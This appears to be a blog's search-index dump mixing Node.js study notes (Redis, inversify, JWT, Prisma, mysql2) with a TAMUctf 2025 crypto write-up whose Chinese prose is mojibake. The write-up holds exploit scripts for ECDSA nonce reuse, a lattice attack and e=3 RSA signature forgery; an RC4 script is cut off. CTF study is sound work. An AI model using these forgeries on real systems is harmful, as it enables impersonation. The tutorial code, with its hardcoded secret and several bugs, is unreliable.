redis.call(\"incr\", key) redis.call(\"expire\", key, inerval) return 1 end åªå¾—æ³¨æ„çš„é—®é¢˜åœ¨äºè·¨åŸŸå¤„ç†ï¼Œæ„Ÿè§‰luaçš„è¯­æ³•è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œæ³¨æ„å’Œjsçš„äº¤äº’å¤„ç† ","date":"2025-04-06","objectID":"/study_nodejs4/:2:0","tags":["å¼€å‘","study"],"title":"Study nodejs ã€Œ4ã€","uri":"/study_nodejs4/"},{"categories":["nodejs"],"content":"MVC è¿™çœŸçš„å¾ˆjavaå§ï¼ˆï¼‰ ","date":"2025-04-06","objectID":"/study_nodejs3/:1:0","tags":["å¼€å‘","study"],"title":"Study nodejsã€Œ3ã€","uri":"/study_nodejs3/"},{"categories":["nodejs"],"content":"å®‰è£…ä¾èµ– npm install inversify reflect-metadata express inversify-express-util prisma class-validator class-transformer (æ•°æ®åº“çš„ä¸œè¥¿ç”¨çš„è¿˜æ˜¯ä¸Šæ¬¡çš„ï¼Œæ‡’å¾—æäº†ï¼Œç„¶åæœ‰ä¸ªç‰ˆæœ¬é—®é¢˜ï¼Œnpm install inversify-express-utilsè¦æ±‚inversify@6.0.3express@4.21.1 ) ","date":"2025-04-06","objectID":"/study_nodejs3/:1:1","tags":["å¼€å‘","study"],"title":"Study nodejsã€Œ3ã€","uri":"/study_nodejs3/"},{"categories":["nodejs"],"content":"å°è£…æ–¹æ³• main.tx import { InversifyExpressServer } from 'inversify-express-utils' import { Container } from 'inversify' const container = new Container() const server = new InversifyExpressServer(container) const app = server.build() app.listen(3000, () =\u003e { console.log('server started') }) è¿™æ˜¯æœ€ç®€å•çš„å°è£…ï¼ŒæŠŠexpresså°è£…æˆä¸€ä¸ªserver src ä¸‹é¢åˆ›å»ºäº®ä¸ªæ–‡ä»¶å¤¹ï¼Œä¸€ä¸ªuser,ä¸€ä¸ªdb db --index.ts user --server.ts --user.dto.ts --controller.ts ","date":"2025-04-06","objectID":"/study_nodejs3/:1:2","tags":["å¼€å‘","study"],"title":"Study nodejsã€Œ3ã€","uri":"/study_nodejs3/"},{"categories":["nodejs"],"content":"æ­£å¼å†™å…¥ main.ts import 'reflect-metadata' import { InversifyExpressServer } from 'inversify-express-utils' import { Container } from 'inversify' import { UserController } from './src/user/controller' import { UserService } from './src/user/service' import express from 'express' import { PrismaClient } from '@prisma/client' import { PrismaDB } from './src/db' const container = new Container() //Iocæä¸ªå®¹å™¨ /** * prismaä¾èµ–æ³¨å…¥ */ //æ³¨å…¥å·¥å‚å°è£…db container.bind\u003cPrismaClient\u003e('PrismaClient').toFactory(()=\u003e{ return () =\u003e { return new PrismaClient() } }) container.bind(PrismaDB).toSelf() /** * useræ¨¡å— */ container.bind(UserService).to(UserService) //æ·»åŠ åˆ°å®¹å™¨ container.bind(UserController).to(UserController) //æ·»åŠ åˆ°å®¹å™¨ /** * postæ¨¡å— */ const server = new InversifyExpressServer(container) //è¿”å›server //ä¸­é—´ä»¶ç¼–å†™åœ¨è¿™å„¿ server.setConfig(app =\u003e { app.use(express.json()) //æ¥å—json }) const app = server.build() //appå°±æ˜¯express app.listen(3000, () =\u003e { console.log('http://localhost:3000') }) user/controller.ts import { controller, httpGet as GetMapping, httpPost as PostMapping } from 'inversify-express-utils' import { inject } from 'inversify' import { UserService } from './service' import type { Request, Response } from 'express' @controller('/user') //è·¯ç”± export class UserController { constructor( @inject(UserService) private readonly userService: UserService, //ä¾èµ–æ³¨å…¥ ) { } @GetMapping('/index') //getè¯·æ±‚ public async getIndex(req: Request, res: Response) { console.log(req?.user.id) const info = await this.userService.getUserInfo() res.send(info) } @PostMapping('/create') //postè¯·æ±‚ public async createUser(req: Request, res: Response) { const user = await this.userService.createUser(req.body) res.send(user) } } user/service.ts import { injectable, inject } from 'inversify' import { UserDto } from './user.dto' import { plainToClass } from 'class-transformer' //dtoéªŒè¯ import { validate } from 'class-validator' //dtoéªŒè¯ import { PrismaDB } from '../db' @injectable() export class UserService { constructor( @inject(PrismaDB) private readonly PrismaDB: PrismaDB //ä¾èµ–æ³¨å…¥ ) { } public async getUserInfo() { return await this.PrismaDB.prisma.user.findMany() } public async createUser(data: UserDto) { const user = plainToClass(UserDto, data) const errors = await validate(user) const dto = [] if (errors.length) { errors.forEach(error =\u003e { Object.keys(error.constraints).forEach(key =\u003e { dto.push({ [error.property]: error.constraints[key] }) }) }) return dto } else { const userInfo = await this.PrismaDB.prisma.user.create({ data: user }) return userInfo } } } user/user.dto.ts import { IsNotEmpty, IsEmail } from 'class-validator' import { Transform } from 'class-transformer' export class UserDto { @IsNotEmpty({ message: 'ç”¨æˆ·åå¿…å¡«' }) @Transform(user =\u003e user.value.trim()) name: string @IsNotEmpty({ message: 'é‚®ç®±å¿…å¡«' }) @IsEmail({},{message: 'é‚®ç®±æ ¼å¼ä¸æ­£ç¡®'}) @Transform(user =\u003e user.value.trim()) email: string } db/index.ts import { injectable, inject } from 'inversify' import { PrismaClient } from '@prisma/client' @injectable() export class PrismaDB { prisma: PrismaClient constructor(@inject('PrismaClient') PrismaClient: () =\u003e PrismaClient) { this.prisma = PrismaClient() } } æ€»ä½“æ€æƒ³æ˜¯å»æŠŠä¸åŒçš„éƒ¨åˆ†å»åˆ†åˆ«å°è£…ï¼Œç„¶åé€šè¿‡inversifyå»æ³¨å…¥ï¼Œè¿™æ ·å­å°±å®ç°äº†ä¸€ä¸ªç®€å•çš„MVCæ¡†æ¶ï¼Œæœ‰ç‚¹ç±»ä¼¼javaäº†ï¼Œä½†æ˜¯æ›´åŠ æ‰‹åŠ¨ï¼ŒdtoéªŒè¯å¯ä»¥å»é™åˆ¶æ–‡ä»¶å†…å®¹ï¼Œç±»ä¼¼pythonçš„reã€‚ ","date":"2025-04-06","objectID":"/study_nodejs3/:1:3","tags":["å¼€å‘","study"],"title":"Study nodejsã€Œ3ã€","uri":"/study_nodejs3/"},{"categories":["nodejs"],"content":"JWT ","date":"2025-04-06","objectID":"/study_nodejs3/:2:0","tags":["å¼€å‘","study"],"title":"Study nodejsã€Œ3ã€","uri":"/study_nodejs3/"},{"categories":["nodejs"],"content":"å®‰è£…ä¾èµ– npm install jsonwebtoken passport passport-jwt ","date":"2025-04-06","objectID":"/study_nodejs3/:2:1","tags":["å¼€å‘","study"],"title":"Study nodejsã€Œ3ã€","uri":"/study_nodejs3/"},{"categories":["nodejs"],"content":"å®ç° æˆ‘ä»¬åœ¨srcä¸­æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹jwtï¼Œæ–°å»ºä¸€ä¸ªindex.ts jwt/index.ts import { injectable} from 'inversify' import passport from 'passport' import jsonwebtoken from 'jsonwebtoken' import {Strategy,ExtractJwt} from 'passport-jwt' @injectable() export class JWT { private secret:string='awfbkuahfbakjhfbafuwhjbeawhjfn' private jwtOptions={ jwtFromRequest:ExtractJwt.fromAuthHeaderAsBearerToken(), secretOrKey:this.secret } constructor(){ this.strategy() } public strategy(){ let str=new Strategy(this.jwtOptions,(payload,done)=\u003e{ done(null,payload) }) passport.use(str)//æ¿€æ´»æ’ä»¶ } static middleware(){ return passport.authenticate('jwt',{session:false}) }//ç»è¿‡jwtè®¤è¯åæ‰èƒ½è¿›å…¥åˆ°ä¸‹ä¸€ä¸ª //ç”Ÿæˆtoken public createToken(data:Object) { jsonwebtoken.sign(data,this.secret,{expiresIN:'1h'}) } //å…³è”express public init(){ return passport.initialize() } } éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬è¦å»æ¿€æ´»æ’ä»¶ï¼Œå¹¶ä¸”è¦å…³è”express main.ts import 'reflect-metadata' import { InversifyExpressServer } from 'inversify-express-utils' import { Container } from 'inversify' import { User } from './src/user/controller' import { UserService } from './src/user/services' import express from 'express' import { PrismaClient } from '@prisma/client' import { PrismaDB } from './src/db' import { JWT } from './src/jwt' const container = new Container() /** * useræ¨¡å— */ container.bind(User).to(User) container.bind(UserService).to(UserService) /** * å°è£…PrismaClient */ container.bind\u003cPrismaClient\u003e('PrismaClient').toFactory(() =\u003e { return () =\u003e { return new PrismaClient() } }) container.bind(PrismaDB).to(PrismaDB) /** * jwtæ¨¡å— */ container.bind(JWT).to(JWT) //ä¸»è¦ä»£ç  const server = new InversifyExpressServer(container) server.setConfig((app) =\u003e { app.use(express.json()) app.use(container.get(JWT).init()) //ä¸»è¦ä»£ç  }) const app = server.build() app.listen(3000, () =\u003e { console.log('Listening on port 3000') }) user/controller.ts import { controller, httpGet as GetMapping, httpPost as PostMapping } from 'inversify-express-utils' import { UserService } from './services' import { inject } from 'inversify' import type { Request, Response } from 'express' import { JWT } from '../jwt' const {middleware} = new JWT() @controller('/user') export class User { constructor(@inject(UserService) private readonly UserService: UserService) { } @GetMapping('/index',middleware()) //ä¸»è¦ä»£ç  public async getIndex(req: Request, res: Response) { let result = await this.UserService.getList() res.send(result) } @PostMapping('/create') public async createUser(req: Request, res: Response) { let result = await this.UserService.createUser(req.body) res.send(result) } } user/services.ts import { injectable, inject } from 'inversify' import { PrismaDB } from '../db' import { UserDto } from './user.dto' import { plainToClass } from 'class-transformer' import { validate } from 'class-validator' import { JWT } from '../jwt' @injectable() export class UserService { constructor( @inject(PrismaDB) private readonly PrismaDB: PrismaDB, @inject(JWT) private readonly jwt: JWT //ä¾èµ–æ³¨å…¥ ) { } public async getList() { return await this.PrismaDB.prisma.user.findMany() } public async createUser(user: UserDto) { let userDto = plainToClass(UserDto, user) const errors = await validate(userDto) if (errors.length) { return errors } else { const result = await this.PrismaDB.prisma.user.create({ data: user }) return { ...result, token: this.jwt.createToken(result) //ç”Ÿæˆtoken } } } } ç„¶åä¼šå‘ç°æ¥æ”¶ä¿¡æ¯å­˜åœ¨ç±»å‹é—®é¢˜ï¼Œæˆ‘ä»¬åœ¨main.tsåŠ å…¥ declare global { namespace Express { interface Request { id: number name: string email: string } } } ","date":"2025-04-06","objectID":"/study_nodejs3/:2:2","tags":["å¼€å‘","study"],"title":"Study nodejsã€Œ3ã€","uri":"/study_nodejs3/"},{"categories":["nodejs"],"content":"æœ€åç»“æ„ â”œâ”€â”€ main.ts # åº”ç”¨å…¥å£æ–‡ä»¶ â”œâ”€â”€ src/ â”œâ”€â”€ db/ # æ•°æ®åº“ç›¸å…³ â”‚ â””â”€â”€ index.ts â”œâ”€â”€ jwt/ # JWTè®¤è¯ç›¸å…³ â”‚ â””â”€â”€ index.ts â””â”€â”€ user/ # ç”¨æˆ·æ¨¡å— â”œâ”€â”€ controller.ts # æ§åˆ¶å™¨ â”œâ”€â”€ service.ts # æœåŠ¡å±‚ â””â”€â”€ user.dto.ts # æ•°æ®ä¼ è¾“å¯¹è±¡ ","date":"2025-04-06","objectID":"/study_nodejs3/:3:0","tags":["å¼€å‘","study"],"title":"Study nodejsã€Œ3ã€","uri":"/study_nodejs3/"},{"categories":["nodejs"],"content":"nodejs\u0026mysql ç°åœ¨å­¦mysqlå’Œsqlserver(å­¦æ ¡è€å¸ˆå¼ºåˆ¶è¦æ±‚çš„)æ¯”è¾ƒå¤šï¼Œå°±å…ˆæ‹¿è¿™äº›ä¸¾ä¾‹å­äº† ","date":"2025-04-01","objectID":"/study_nodejs2/:1:0","tags":["å¼€å‘","study"],"title":"Study nodejsã€Œ2ã€","uri":"/study_nodejs2/"},{"categories":["nodejs"],"content":"mysql2 ä¸€ä¸ªæŠŠnodejs\u0026mysql\u0026expressè¿æ¥çš„åŒ…ï¼Œé¡ºä¾¿ä½¿ç”¨js-yamlå»å†™é…ç½® npm install mysql2 express js-yaml db.config.yaml db: user:root password:'root' host:127.0.0.1 port:3306 database:test ä¸»è¦æŠŠipç«¯å£å’Œè´¦å·å¯†ç ä»¥åŠåº“çš„åç§°å†™å…¥è¿›å» index.js import express from 'express'; import mysql2 from 'mysql2/promise'; import fs from 'fs'; import jsyaml from 'js-yaml'; const yaml = fs.readFileSync('./db.config.yaml', 'utf8') const config = jsyaml.load(yaml) console.log(config) const sql = await mysql2.createConnection({ ...config.db }) const app = express(); app.use(express.json()) app.get('/', async (res, req) =\u003e { const [data] = await sql.query('SELECT * FROM users') res.send(data) }) app.get('/user/:id', async (res, req) =\u003e { const [row] = await sql.query('SELECT * FROM users WHERE id = ?', [req.params.id]) res.send(row) }) app.use('/create', async (req, res) =\u003e { const { name, age, hobby } = req.body await sql.query('INSERT INTO users (name,age,hobby) VALUES (?,?,?)', [name, age, hobby]) res.send('ok') }) app.use('/update', async (req, res) =\u003e { const { id, name, age, hobby } = req.body await sql.query('UPDATE users SET name = ?, age = ?, hobby = ? WHERE id = ?', [name, age, hobby, id]) res.send('ok') }) app.post('/delete',async (req,res)=\u003e{ await sql.query(`delete from user where id = ?`,[req.body.id]) res.send({ok:1}) }) const port = 3000; app.listen(port, () =\u003e { console.log(`Server is running on port ${port}`); }); é€šè¿‡ä¸Šé¢çš„æ¥å£å®ç°å¢åˆ æ”¹æŸ¥ï¼Œç„¶åæµ‹è¯•çš„è¯ç”¨çš„æ˜¯vscçš„REST Clientæ’ä»¶ # æŸ¥è¯¢å…¨éƒ¨ GET http://localhost:3000/ HTTP/1.1 # å•ä¸ªæŸ¥è¯¢ GET http://localhost:3000/user/2 HTTP/1.1 # æ·»åŠ æ•°æ® POST http://localhost:3000/create HTTP/1.1 Content-Type: application/json { \"name\":\"å¼ ä¸‰\", \"age\":18 } # æ›´æ–°æ•°æ® POST http://localhost:3000/update HTTP/1.1 Content-Type: application/json { \"name\":\"æ³•å¤–ç‹‚å¾’\", \"age\":20, \"id\":23 } #åˆ é™¤ # POST http://localhost:3000/delete HTTP/1.1 # Content-Type: application/json # { # \"id\":24 # } ","date":"2025-04-01","objectID":"/study_nodejs2/:1:1","tags":["å¼€å‘","study"],"title":"Study nodejsã€Œ2ã€","uri":"/study_nodejs2/"},{"categories":["nodejs"],"content":"prisma ä¸€ä¸ªç°ä»£çš„ormæ¡†æ¶ï¼Œä½¿ç”¨èµ·æ¥æ¯”è¾ƒæ–¹ä¾¿ï¼Œæµè¡Œçš„æ•°æ®åº“ä¹Ÿéƒ½æ”¯æŒã€‚ ","date":"2025-04-01","objectID":"/study_nodejs2/:1:2","tags":["å¼€å‘","study"],"title":"Study nodejsã€Œ2ã€","uri":"/study_nodejs2/"},{"categories":["nodejs"],"content":"å®‰è£…ä»¥åŠåˆå§‹åŒ– //å®‰è£… npm install prisma //åˆå§‹åŒ– prisma init --datasource-provider mysql //è¿æ¥mysql ä¿®æ”¹.envæ–‡ä»¶ [DATABASE_URL=\"mysql://è´¦å·:å¯†ç @ä¸»æœº:ç«¯å£/åº“å\"] ","date":"2025-04-01","objectID":"/study_nodejs2/:1:3","tags":["å¼€å‘","study"],"title":"Study nodejsã€Œ2ã€","uri":"/study_nodejs2/"},{"categories":["nodejs"],"content":"åˆ›å»ºæ•°æ®åº“ prisma/schema.prisma model Post { id Int @id @default(autoincrement()) //id æ•´æ•° è‡ªå¢ title String //titleå­—ç¬¦ä¸²ç±»å‹ publish Boolean @default(false) //å‘å¸ƒ å¸ƒå°”å€¼é»˜è®¤false author User @relation(fields: [authorId], references: [id]) //ä½œè€… å…³è”ç”¨æˆ·è¡¨ å…³è”å…³ç³» authorId å…³è”userè¡¨çš„id authorId Int } model User { id Int @id @default(autoincrement()) name String email String @unique posts Post[] } æ‰§è¡Œå‘½ä»¤ prisma migrate dev æˆ–è€…æ˜¯ç›´æ¥å…¨éƒ¨å†™å…¥ generator client { provider = \"prisma-client-js\" } datasource db { provider = \"mysql\" url = env(\"DATABASE_URL\") } model Post { id Int @id @default(autoincrement()) //id æ•´æ•° è‡ªå¢ title String //titleå­—ç¬¦ä¸²ç±»å‹ publish Boolean @default(false) //å‘å¸ƒ å¸ƒå°”å€¼é»˜è®¤false author User @relation(fields: [authorId], references: [id]) //ä½œè€… å…³è”ç”¨æˆ·è¡¨ å…³è”å…³ç³» authorId å…³è”userè¡¨çš„id authorId Int } model User { id Int @id @default(autoincrement()) name String email String @unique posts Post[] } ä»–ä¼šè‡ªåŠ¨å¸®ä½ åˆ›å»ºä¸€ä¸ª.sqlæ–‡ä»¶ -- CreateTable CREATE TABLE `Post` ( `id` INTEGER NOT NULL AUTO_INCREMENT, `title` VARCHAR(191) NOT NULL, `publish` BOOLEAN NOT NULL DEFAULT false, `authorId` INTEGER NOT NULL, PRIMARY KEY (`id`) ) DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; -- CreateTable CREATE TABLE `User` ( `id` INTEGER NOT NULL AUTO_INCREMENT, `name` VARCHAR(191) NOT NULL, `email` VARCHAR(191) NOT NULL, UNIQUE INDEX `User_email_key`(`email`), PRIMARY KEY (`id`) ) DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci; -- AddForeignKey ALTER TABLE `Post` ADD CONSTRAINT `Post_authorId_fkey` FOREIGN KEY (`authorId`) REFERENCES `User`(`id`) ON DELETE RESTRICT ON UPDATE CASCADE; ","date":"2025-04-01","objectID":"/study_nodejs2/:1:4","tags":["å¼€å‘","study"],"title":"Study nodejsã€Œ2ã€","uri":"/study_nodejs2/"},{"categories":["nodejs"],"content":"ä½¿ç”¨ å…¶å®è¿™ä¸ªä¸œè¥¿å’Œtsè”åŠ¨æ˜¯æœ€å¼ºçš„ï¼Œæ‰€ä»¥ä¸‹é¢å°±å†™tsäº† import express from 'express' import { PrismaClient } from '@prisma/client' const prisma = new PrismaClient() const app = express() const port: number = 3000 app.use(express.json()) //å…³è”æŸ¥æ‰¾ app.get('/', async (req, res) =\u003e { const data = await prisma.user.findMany({ include: { posts: true } }) res.send(data) }) //å•ä¸ªæŸ¥æ‰¾ app.get('/user/:id', async (req, res) =\u003e { const row = await prisma.user.findMany({ where: { id: Number(req.prisma.id) } }) res.send(row) }) //æ–°å¢ app.post('/create', async (req, res) =\u003e { const { name, email } = req.body const data = await prisma.user.create({ data: { name, email, posts: { create: { title: 'æ ‡é¢˜', publish: true }, } } }) res.send(data) }) //æ›´æ–° app.post('/update',async (req, res) =\u003e { const {id,name,email}=req.body const data=await prisma.user.update({ where:{ id:Number(id) }, data:{ name, email } }) req.send(data) }) //åˆ é™¤ app.post('/delete', async (req, res) =\u003e { const { id } = req.body await prisma.post.deleteMany({ where: { authorId: Number(id) } }) const data = await prisma.user.delete({ where: { id: Number(id), }, }) res.send(data) }) app.listen(port, () =\u003e { console.log(`Example app listening on port ${port}`) }) ","date":"2025-04-01","objectID":"/study_nodejs2/:1:5","tags":["å¼€å‘","study"],"title":"Study nodejsã€Œ2ã€","uri":"/study_nodejs2/"},{"categories":["CTF"],"content":"å‰è¨€ è¿™æ˜¯ä¸€ä¸ªå›½å¤–å­¦æ ¡çš„æ¯”èµ›ï¼Œå¯†ç è´¨é‡å¾ˆé«˜ ","date":"2025-03-31","objectID":"/tamuctf2025/:1:0","tags":["crypto"],"title":"Tamuctf2025","uri":"/tamuctf2025/"},{"categories":["CTF"],"content":"é¢˜ç›® ","date":"2025-03-31","objectID":"/tamuctf2025/:2:0","tags":["crypto"],"title":"Tamuctf2025","uri":"/tamuctf2025/"},{"categories":["CTF"],"content":"ECC Can you get the secret key from the following two signed messages? 1st Message: â€œThe secp256r1 curve was used.â€ 2nd Message: â€œk value may have been re-used.â€ 1st Signature r value: 91684750294663587590699225454580710947373104789074350179443937301009206290695 1st Signature s value: 8734396013686485452502025686012376394264288962663555711176194873788392352477 2nd Signature r value: 91684750294663587590699225454580710947373104789074350179443937301009206290695 2nd Signature s value: 96254287552668750588265978919231985627964457792323178870952715849103024292631 The flag is the secret key used to sign the messages. It will be in the flag format. task from Crypto.Util.number import bytes_to_long, long_to_bytes from hashlib import sha256 from secret import sign message1 = \"The secp256r1 curve was used.\" message2 = \"k value may have been re-used.\" message1 = bytes_to_long(sha256(message1.encode()).digest()) message2 = bytes_to_long(sha256(message2.encode()).digest()) r1, s1 = sign(message1) r2, s2 = sign(message2) print(f\"r1: {r1}, s1: {s1}\") print(f\"r2: {r2}, s2: {s2}\") å¾ˆç®€å•çš„ECDSAï¼Œç›´æ¥è®¡ç®—å³å¯ exp from hashlib import sha256 from Crypto.Util.number import* n = 115792089210356248762697446949407573529996955224135760342422259061068512044369 message1 = \"The secp256r1 curve was used.\" message2 = \"k value may have been re-used.\" r = 91684750294663587590699225454580710947373104789074350179443937301009206290695 s1 = 8734396013686485452502025686012376394264288962663555711176194873788392352477 s2 = 96254287552668750588265978919231985627964457792323178870952715849103024292631 H_m1 = bytes_to_long(sha256(message1.encode()).digest()) H_m2 = bytes_to_long(sha256(message2.encode()).digest()) print(f\"H(m1) = {H_m1}\") print(f\"H(m2) = {H_m2}\") diff_h = (H_m1 - H_m2) % n diff_s = (s1 - s2) % n inv_diff_s = inverse(diff_s, n) k = (diff_h * inv_diff_s) % n print(f\"k = {k}\") r_inv = inverse(r, n) d = ((s1 * k - H_m1) % n) * r_inv % n print(f\"Private key d = {d}\") k_inv = inverse(k, n) computed_s1 = (k_inv * (H_m1 + d * r)) % n computed_s2 = (k_inv * (H_m2 + d * r)) % n print(long_to_bytes(d)) ","date":"2025-03-31","objectID":"/tamuctf2025/:2:1","tags":["crypto"],"title":"Tamuctf2025","uri":"/tamuctf2025/"},{"categories":["CTF"],"content":"Mod task import re with open(\"flag.txt\") as f: flag = f.read() assert re.fullmatch(r\"gigem\\{[a-z0-9_]{38}\\}\",flag) flag_num = int.from_bytes(flag.encode(), 'big') assert flag_num % 114093090821120352479644063983906458923779848139997892783140659734927967458173 == 58809011802516045741268578327158509054400633329629779038362406616616290661238 ä¸€ä¸ªå¾ˆåƒå°é¸¡å—åœ¨nssçš„dlcå‡ºçš„é¢˜ï¼Œä½†æ˜¯æ›´åŠ å¤æ‚ï¼Œé¸¡å—çš„é¢˜å¤§éƒ¨åˆ†æ˜¯åœ¨åŒä¸€ä¸ªèŒƒå›´ï¼Œæ¯”å¦‚07ï¼ŒNssè¿™ç§æœ‰è§„å¾‹æ€§çš„ï¼Œæˆ–è€…æ˜¯å¯ä»¥ç”¨çº¿æ€§è¡¨è¾¾çš„ï¼Œä½†æ˜¯è¿™ä¸ªé¢˜ä¸è¡Œï¼Œæˆ‘å°è¯•äº†åªç”¨09çš„æ•°å­—å»æ±‚è§£flagï¼Œå¯ä»¥è§„çº¦å‡ºæ¥ä¸€ç»„ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯ç›®æ ‡ç­”æ¡ˆ å®˜æ–¹é¢„æœŸè§£æ³• import string import re from sage.all import * chrs = (string.ascii_letters + string.digits + \"_\").encode() avg = sorted(chrs)[len(chrs) // 2] - 1 print(f\"{avg = }\") print([x - avg for x in sorted(chrs)]) # within [-37, 37] flaglen = 38 M = 114093090821120352479644063983906458923779848139997892783140659734927967458173 C = int.from_bytes(b\"gigem{\" + b\"\\x00\" * flaglen + b\"}\", \"big\") rem = 58809011802516045741268578327158509054400633329629779038362406616616290661238 C -= rem P = PolynomialRing(ZZ, \"ap\", flaglen) aps = P.gens() aa = [ap + avg for ap in aps] f = C + sum([a * 256**i for i, a in enumerate(aa)]) * 256 print(f) L = matrix(f.coefficients()).T L = block_matrix([[M, 0], [L, 1]]) bounds = [1] + [37] * flaglen + [1] scale = [2**20 // i for i in bounds] Q = diagonal_matrix(scale) L *= Q L = L.BKZ(block_size=25) L /= Q # not good enough # for row in L: # if row[-1] \u003c 0: # row = -row # if row[0] == 0 and row[-1] == 1: # print(row) # print(f(*row[1:-1]) % M == 0) # aa = [x + avg for x in row[1:-1]][::-1] # flag = b\"gigem{\" + bytes(aa) + b\"}\" # # assert int.from_bytes(flag, \"big\") % M == rem # print(flag) # exit() from fpylll import IntegerMatrix, LLL from fpylll.fplll.gso import MatGSO from fpylll.fplll.enumeration import Enumeration sols = [] L[:, 0] *= 2**10 A = IntegerMatrix.from_matrix(L.change_ring(ZZ)) LLL.reduction(A) MG = MatGSO(A) MG.update_gso() sol_cnt = 10000 enum = Enumeration(MG, sol_cnt) size = int(L.nrows()) bound = 37 answers = enum.enumerate(0, size, (size * bound**2), 0, pruning=None) for _, s in answers: v = IntegerMatrix.from_iterable(1, A.nrows, map(int, s)) sv = v * A if abs(sv[0, size - 1]) \u003c= bound and sv[0, -1] in (-1, 1): print(sv) neg = sv[0, -1] sol = [neg * sv[0, i + 1] for i in range(flaglen)] assert f(*sol) % M == 0 aa = [x + avg for x in sol][::-1] try: flag = b\"gigem{\" + bytes(aa) + b\"}\" except: continue assert int.from_bytes(flag, \"big\") % M == rem print(flag) try: if re.fullmatch(r\"gigem{\\w{38}}\", flag.decode()): print(\"FOUND\") break except UnicodeDecodeError: pass èµ›åæˆ‘ç”¨å¦ä¸€ä¸ªèµ›é¢˜çš„wpä¸­çš„æ–¹æ³•è¿è¡Œä¸‰ååˆ†é’Ÿå‡ºæ¥äº†ï¼Œ é“¾æ¥https://connor-mccartney.github.io/cryptography/other/onelinecrypto-SeeTF-2023 from Crypto.Util.number import * from sage.all import * import re def lattice_enumeration(L, bound, sol_cnt=1_000_000): from fpylll import IntegerMatrix, LLL from fpylll.fplll.gso import MatGSO from fpylll.fplll.enumeration import Enumeration A = IntegerMatrix.from_matrix(L) LLL.reduction(A) M_mat = MatGSO(A) M_mat.update_gso() size = int(L.nrows()) enum = Enumeration(M_mat, sol_cnt) answers = enum.enumerate(0, size, (size * bound**2), 0, pruning=None) print(f'Got {len(answers)} answers') for _, s in answers: # print(len(answers)) v = IntegerMatrix.from_iterable(1, A.nrows, map(int, s)) sv = v * A if abs(sv[0, size - 1]) \u003c= bound: yield sv[0] M_val = 114093090821120352479644063983906458923779848139997892783140659734927967458173 R_val = 58809011802516045741268578327158509054400633329629779038362406616616290661238 C = bytes_to_long(b\"gigem{\" + bytes(38) + b\"}\") a = 85 dim = 38 M_lattice = (identity_matrix(dim) .augment(vector([0]*dim)) .augment(vector([256**i for i in range(dim, 0, -1)])) .stack(vector([-a]*dim + [1, C - R_val])) .stack(vector([0]*dim + [0, -M_val])) ) found = False for row in lattice_enumeration(M_lattice.change_ring(ZZ), 37, sol_cnt=500_000): for sign in [1, -1]: r = [sign * x for x in row] if r[-2:] != [1, 0]: continue try: candidate = b\"gigem{\" + bytes([x + a for x in r[:-2]]) + b\"}\" if re.fullmatch(r\"[a-z0-9_]{38}\", candidate.decode()[6:-1]): if int.fr","date":"2025-03-31","objectID":"/tamuctf2025/:2:2","tags":["crypto"],"title":"Tamuctf2025","uri":"/tamuctf2025/"},{"categories":["CTF"],"content":"Smelter åŸé™„ä»¶æœ‰ç‚¹å¤§ï¼Œä¸æ”¾äº†ï¼Œä¸ªäººæ„Ÿè§‰æ²¡modæ¶å¿ƒ exp SHA256_OID = (2, 16, 840, 1, 101, 3, 4, 2, 1) class AlgorithmIdentifier(univ.Sequence): componentType = namedtype.NamedTypes( namedtype.NamedType('algorithm', univ.ObjectIdentifier()), namedtype.NamedType('parameters', univ.Null()) ) class DigestInfo(univ.Sequence): componentType = namedtype.NamedTypes( namedtype.NamedType('digestAlgorithm', AlgorithmIdentifier()), namedtype.NamedType('digest', univ.OctetString()) ) def get_digestinfo(hash_bytes): alg = AlgorithmIdentifier() alg['algorithm'] = SHA256_OID alg['parameters'] = univ.Null() di = DigestInfo() di['digestAlgorithm'] = alg di['digest'] = hash_bytes return encoder.encode(di) def integer_cube_root(n: int) -\u003e int: low = 0 high = 1 \u003c\u003c ((n.bit_length() + 2) // 3) while low \u003c high: mid = (low + high) // 2 if mid**3 \u003c n: low = mid + 1 else: high = mid if low**3 \u003e n: low -= 1 return low # The Forgery Routin def forge_signature(): message = b\"admin\" h = hashlib.sha256(message).digest() t = get_digestinfo(h) minimal_prefix = b\"\\x00\\x01\\xff\\x00\" + t target_block = minimal_prefix.ljust(256, b\"\\x00\") target_int = int.from_bytes(target_block, byteorder=\"big\") s = integer_cube_root(target_int) while True: candidate = s**3 candidate_bytes = candidate.to_bytes(256, byteorder=\"big\") try: data_section = candidate_bytes[3:] sep_index = data_section.index(b\"\\x00\") recovered = data_section[sep_index+1:] except Exception: recovered = b\"\" if candidate_bytes.startswith(b\"\\x00\\x01\\xff\\x00\") and recovered.startswith(t): break s += 1 forged_sig = s.to_bytes(256, byteorder=\"big\") print(\"forged sing (b64):\") print(base64.b64encode(forged_sig).decode()) return forged_sig if __name__ == \"__main__\": forge_signature() ","date":"2025-03-31","objectID":"/tamuctf2025/:2:3","tags":["crypto"],"title":"Tamuctf2025","uri":"/tamuctf2025/"},{"categories":["CTF"],"content":"RC4 task from Crypto.Cipher import ARC4 import os from string import printable from random import choices IV = ''.join(choices(printable,k=32)).encode() for i in range(96): nonce = input(\"Give me a prefix (hex): \") try: nonce = bytes.fromhex(nonce) except: print(\"Make sure to send in hex.\") exit() if len(nonce) + len(IV) \u003e 256: print(\"Your prefix is too long.\") exit() try: cipher = ARC4.new(nonce + IV) except: print(\"Could not create the cipher.\") exit() pt = b\"\\0\" ct = cipher.encrypt(pt) print(f\"Your lucky number is {ord(ct)}\") guess = input(\"What was the IV(hex): \") try: guess = bytes.fromhex(guess) except: print(\"Make sure to send your guess for the IV in hex.\") exit() if IV == guess: with open(\"flag.txt\",\"r\") as f: FLAG = f.read() print(FLAG) else: print(f\"WRONG! IV was {IV.hex()}\") from pwn import * context.log_level = \"debug\" io = remote(\"tamuctf.com\", 443, ssl=True, sni=\"tamuctf_rc4-prefix\") io.interactive(prompt=\"\") æœ‰ä¸€è¯´ä¸€ï¼Œä¸æ˜¯ç‰¹åˆ«ç†Ÿï¼Œè¿™é‡Œå€Ÿé‰´åˆ«çš„ä½¬çš„ä»£ç ï¼Œå›å¤´å­¦ä¼šäº†å•ç‹¬å†™å§ exp from Crypto.Cipher import ARC4 import random from pwn import * from collections import Counter def key_schedule(key): S = 